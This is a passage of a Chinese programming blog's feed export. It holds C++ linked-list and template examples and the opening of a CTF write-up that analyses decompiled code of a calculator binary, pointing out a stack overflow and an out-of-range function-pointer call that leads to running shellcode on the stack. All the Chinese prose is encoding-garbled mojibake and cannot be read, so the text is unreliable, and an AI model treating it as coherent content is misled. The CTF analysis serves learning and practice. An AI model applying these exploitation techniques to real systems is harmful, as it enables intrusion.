class="line">             <span class="type">int</span> n;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥å•é“¾è¡¨çš„é•¿åº¦: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">             l.CreateLinkList(n);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">             l.TravalLinkList();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯¥å•é“¾è¡¨çš„é•¿åº¦ä¸º&quot;</span> &lt;&lt; l.GetLength() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">             <span class="keyword">if</span> (l.IsEmpty() == <span class="number">1</span>)</span><br><span class="line">                 <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯¥å•é“¾è¡¨æ˜¯ç©ºè¡¨&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯¥å•é“¾è¡¨ä¸æ˜¯ç©ºè¡¨&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">             DataType data;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥è¦è·å–èŠ‚ç‚¹çš„å€¼: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; data;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯¥èŠ‚ç‚¹çš„å€¼ä¸º&quot;</span> &lt;&lt; l.Find(data)-&gt;data &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">             DataType endData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥è¦åœ¨å°¾éƒ¨æ’å…¥çš„å€¼: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; endData;</span><br><span class="line">             l.InsertElemAtEnd(endData);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">             DataType pointData;</span><br><span class="line">             <span class="type">int</span> index;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥è¦æ’å…¥çš„æ•°æ®: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; pointData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥è¦æ’å…¥æ•°æ®çš„ä½ç½®: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; index;</span><br><span class="line">             l.InsertElemAtIndex(pointData, index);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">             DataType headData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥è¦åœ¨å¤´éƒ¨æ’å…¥çš„å€¼: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; headData;</span><br><span class="line">             l.InsertElemAtHead(headData);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">             l.DeleteElemAtEnd();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">             l.DeleteAll();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">             DataType pointDeleteData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥è¦åˆ é™¤çš„æ•°æ®: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; pointDeleteData;</span><br><span class="line">             l.DeleteElemAtPoint(pointDeleteData);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">             l.DeleteElemAtHead();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">default</span>:</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;<span class="keyword">while</span> (i != <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">     system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" title="æ¨¡æ¿"></a>æ¨¡æ¿</h3><p>åœ¨C++ä¸­ï¼Œæ¨¡æ¿æ˜¯ä¸€ç§å¼ºå¤§çš„ç‰¹æ€§ï¼Œå®ƒå…è®¸ä½ ç¼–å†™ä¸ç±»å‹æ— å…³çš„ä»£ç ã€‚æ¨¡æ¿å¯ä»¥ç”¨äºå‡½æ•°ï¼ˆå‡½æ•°æ¨¡æ¿ï¼‰å’Œç±»ï¼ˆç±»æ¨¡æ¿ï¼‰ã€‚ä¸‹é¢æ˜¯ä¸€äº›å‡½æ•°æ¨¡æ¿å’Œç±»æ¨¡æ¿çš„ç¤ºä¾‹ã€‚</p><h3 id="å‡½æ•°æ¨¡æ¿ç¤ºä¾‹"><a href="#å‡½æ•°æ¨¡æ¿ç¤ºä¾‹" class="headerlink" title="å‡½æ•°æ¨¡æ¿ç¤ºä¾‹"></a>å‡½æ•°æ¨¡æ¿ç¤ºä¾‹</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°æ¨¡æ¿ï¼Œç”¨äºäº¤æ¢ä¸¤ä¸ªå€¼</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swapValues</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123;</span><br><span class="line">    T temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>, b = <span class="number">10</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Before swap: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">swapValues</span>(a, b);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;After swap: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> x = <span class="number">3.14</span>, y = <span class="number">6.28</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Before swap: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">swapValues</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;After swap: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ<code>swapValues</code> æ˜¯ä¸€ä¸ªå‡½æ•°æ¨¡æ¿ï¼Œå®ƒå¯ä»¥ç”¨æ¥äº¤æ¢ä»»ä½•ç±»å‹çš„ä¸¤ä¸ªå€¼ã€‚</p><h3 id="ç±»æ¨¡æ¿ç¤ºä¾‹"><a href="#ç±»æ¨¡æ¿ç¤ºä¾‹" class="headerlink" title="ç±»æ¨¡æ¿ç¤ºä¾‹"></a>ç±»æ¨¡æ¿ç¤ºä¾‹</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç±»æ¨¡æ¿ï¼Œç”¨äºå­˜å‚¨å’Œæ‰“å°å…ƒç´ </span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Printer</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::vector&lt;T&gt; elements;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addElement</span><span class="params">(<span class="type">const</span> T&amp; element)</span> </span>&#123;</span><br><span class="line">        elements.<span class="built_in">push_back</span>(element);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printElements</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; element : elements) &#123;</span><br><span class="line">            std::cout &lt;&lt; element &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Printer&lt;<span class="type">int</span>&gt; intPrinter;</span><br><span class="line">    intPrinter.<span class="built_in">addElement</span>(<span class="number">1</span>);</span><br><span class="line">    intPrinter.<span class="built_in">addElement</span>(<span class="number">2</span>);</span><br><span class="line">    intPrinter.<span class="built_in">addElement</span>(<span class="number">3</span>);</span><br><span class="line">    intPrinter.<span class="built_in">printElements</span>();</span><br><span class="line"></span><br><span class="line">    Printer&lt;std::string&gt; stringPrinter;</span><br><span class="line">    stringPrinter.<span class="built_in">addElement</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    stringPrinter.<span class="built_in">addElement</span>(<span class="string">&quot;World&quot;</span>);</span><br><span class="line">    stringPrinter.<span class="built_in">printElements</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ<code>Printer</code> æ˜¯ä¸€ä¸ªç±»æ¨¡æ¿ï¼Œå®ƒå¯ä»¥ç”¨æ¥å­˜å‚¨å’Œæ‰“å°ä»»ä½•ç±»å‹çš„å…ƒç´ ã€‚</p><h3 id="æ¨¡æ¿ç‰¹åŒ–ç¤ºä¾‹"><a href="#æ¨¡æ¿ç‰¹åŒ–ç¤ºä¾‹" class="headerlink" title="æ¨¡æ¿ç‰¹åŒ–ç¤ºä¾‹"></a>æ¨¡æ¿ç‰¹åŒ–ç¤ºä¾‹</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šç”¨å‡½æ•°æ¨¡æ¿</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">max</span><span class="params">(T a, T b)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;General template&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> (a &gt; b) ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç‰¹åŒ–å‡½æ•°æ¨¡æ¿ï¼Œç”¨äºæ¯”è¾ƒ const char* ç±»å‹</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">max</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* a, <span class="type">const</span> <span class="type">char</span>* b)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Specialized template&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> (std::<span class="built_in">strcmp</span>(a, b) &gt; <span class="number">0</span>) ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>, b = <span class="number">10</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Max of &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; <span class="built_in">max</span>(a, b) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* x = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* y = <span class="string">&quot;banana&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Max of &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; <span class="built_in">max</span>(x, y) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä¸º <code>max</code> å‡½æ•°æ¨¡æ¿æä¾›äº†ä¸€ä¸ªç‰¹åŒ–ç‰ˆæœ¬ï¼Œä¸“é—¨ç”¨äºæ¯”è¾ƒ <code>const char*</code> ç±»å‹çš„å­—ç¬¦ä¸²ã€‚</p><p>è¿™äº›ç¤ºä¾‹å±•ç¤ºäº†C++æ¨¡æ¿çš„åŸºæœ¬ç”¨æ³•ï¼ŒåŒ…æ‹¬å‡½æ•°æ¨¡æ¿ã€ç±»æ¨¡æ¿å’Œæ¨¡æ¿ç‰¹åŒ–ã€‚æ¨¡æ¿æ˜¯C++ä¸­å®ç°æ³›å‹ç¼–ç¨‹çš„å…³é”®ç‰¹æ€§ï¼Œå®ƒå…è®¸ä½ ç¼–å†™é«˜åº¦å¯é‡ç”¨çš„ä»£ç ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ¬ç¯‡blogæ˜¯è¯»è€…æ‰€æ€»ç»“ï¼ˆcvå¤§æ³•å‡æœ‰åŒ…å«å‡ºå¤„ï¼Œç¬”è€…æ°´å¹³æœ‰é™ï¼Œå¦‚æœé”™è¯¯è¯·æŒ‡å‡ºï¼ˆä¸»è¦æœŸæœ«è€ƒæ€»ç»“äº†ä¸€ä¸‹æ–¹ä¾¿è€ƒå‰å†æ¬¡å¤ä¹ &lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="æ€»ç»“" scheme="http://s1nec-1o.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    <category term="C++" scheme="http://s1nec-1o.github.io/categories/%E6%80%BB%E7%BB%93/C/"/>
    
    
    <category term="å¼€å‘" scheme="http://s1nec-1o.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€äº›é¢˜ç›®(formatå’Œieeeæ ‡å‡†)</title>
    <link href="http://s1nec-1o.github.io/2024/05/03/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE-format%E5%92%8Cieee%E6%A0%87%E5%87%86/"/>
    <id>http://s1nec-1o.github.io/2024/05/03/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE-format%E5%92%8Cieee%E6%A0%87%E5%87%86/</id>
    <published>2024-05-03T11:24:30.000Z</published>
    <updated>2024-05-03T11:25:15.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="é¢˜ç›®å¤ç°"><a href="#é¢˜ç›®å¤ç°" class="headerlink" title="é¢˜ç›®å¤ç°"></a>é¢˜ç›®å¤ç°</h1><h1 id="float"><a href="#float" class="headerlink" title="float"></a>float</h1><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">double</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE v6[<span class="number">12</span>]; <span class="comment">// [rsp+8h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">double</span> *v10; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">  <span class="type">double</span> v13; <span class="comment">// [rsp+38h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v14; <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">400LL</span>);</span><br><span class="line">  s = v6;</span><br><span class="line">  v4 = alloca(<span class="number">64LL</span>);</span><br><span class="line">  buf = v6;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">0x180</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  qword_40E0 = s;                               <span class="comment">// å­˜æ ˆåœ°å€</span></span><br><span class="line">  dword_4010 = <span class="number">0</span>;</span><br><span class="line">  sub_1384();</span><br><span class="line">  sub_14C9();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, buf, <span class="number">0x180</span>uLL);                <span class="comment">// æ ˆæº¢å‡º</span></span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">47</span> )</span><br><span class="line">      v7 = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7 &amp;&amp; *(buf + i) != <span class="string">&#x27;\n&#x27;</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(buf + i) &lt;= <span class="string">&#x27; &#x27;</span> || *(buf + i) &gt; <span class="string">&#x27;0&#x27;</span> )<span class="comment">// 0çš„æƒ…å†µæœªåŒ…æ‹¬</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(buf + i) &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; *(buf + i) &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( dword_4010 &gt; <span class="number">47</span> )                <span class="comment">// åªèƒ½è¿ç®—48æ¬¡</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++dword_4010;</span><br><span class="line">          v5 = qword_40E0;</span><br><span class="line">          *v5 = atof(buf + i);</span><br><span class="line">          qword_40E0 += <span class="number">8LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *(buf + i + <span class="number">1</span>) == <span class="string">&#x27;.&#x27;</span> || *(buf + i + <span class="number">1</span>) &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; *(buf + i + <span class="number">1</span>) &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;                                         <span class="comment">// ç¬¦å·å¤„ç†ï¼ˆ0ä¹ŸåŒ…æ‹¬åœ¨é‡Œé¢ï¼Œå¯¼è‡´æ¼æ´</span></span><br><span class="line">        <span class="keyword">if</span> ( dword_4010 &lt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = s;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = <span class="built_in">fabs</span>(*v10);</span><br><span class="line">          <span class="keyword">if</span> ( v13 != <span class="number">0.0</span> &amp;&amp; (v13 &lt; <span class="number">1.0</span> || v13 &gt; <span class="number">100.0</span>) )<span class="comment">// ä¸æ»¡è¶³å³å¯ä½¿ç”¨ä¼ªé€ NaN</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v13);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        (func_list[*(buf + i) - <span class="number">0x20</span>])();       <span class="comment">// å¦‚æœä¸º0ï¼Œä¼šæ‰§è¡Œfunc_list[0x30 - 0x20]()</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( s &lt; qword_40E0 )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Result: %lf\n&quot;</span>, *(qword_40E0 - <span class="number">8</span>));<span class="comment">// ä¾é ASCIIç å¯»æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ä¸º0çš„æ—¶å€™å°±ä¼šæœ‰</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405031925682.png" alt="image-20240502170138697" style="zoom:50%;" /><p>è€Œ<code>qword_40E0 = s;</code> ï¼Œæ˜¯æ ˆä¸Šçš„æŒ‡é’ˆï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œæ ˆä¸Šçš„shellcodeï¼Œç°åœ¨åªéœ€è¦æ‰¾åˆ°ç«™ä¸Šçš„shellcodeæ˜¯æ€ä¹ˆå›äº‹å³å¯</p><p>æœ¬é¢˜ç›®çš„å¤§æ¦‚é€»è¾‘æ˜¯ï¼šé¦–å…ˆå¤§ä½“æ˜¯ä¸€ä¸ªæµ®ç‚¹æ•°è®¡ç®—çš„ç¨‹åºï¼Œå®ƒæœ‰ç€åŠ å‡ä¹˜é™¤çš„åŠŸèƒ½ï¼Œå®ƒæ¯è¯»è¿›ä¸€ä¸ªæ•°ï¼Œå°±ä¼šå°†å…¶ä¿å­˜åœ¨æ ˆä¸Šï¼Œä»¥IEEEæµ®ç‚¹è¡¨ç¤ºå½¢å¼ï¼Œå…¶ä¸­æ¯æ¬¡è¯»è¿›çš„å€¼è¦ä¸æ»¡è¶³<code>a!=0 &amp;&amp; (a&lt;1.0 || a&gt;100.0)</code>çš„æ¡ä»¶ï¼Œç„¶è€Œåœ¨åˆ¤æ–­aæ—¶ï¼Œæœ‰ä¸€ä¸ªçº°æ¼ä¾¿æ˜¯åœ¨åˆ¤æ–­ç¬¦å·çš„æ—¶å€™å°†0ä¹Ÿæ”˜æ‹¬è¿›å»äº†ï¼Œå› æ­¤å¯¼è‡´äº†ä¸€ä¸ªæ 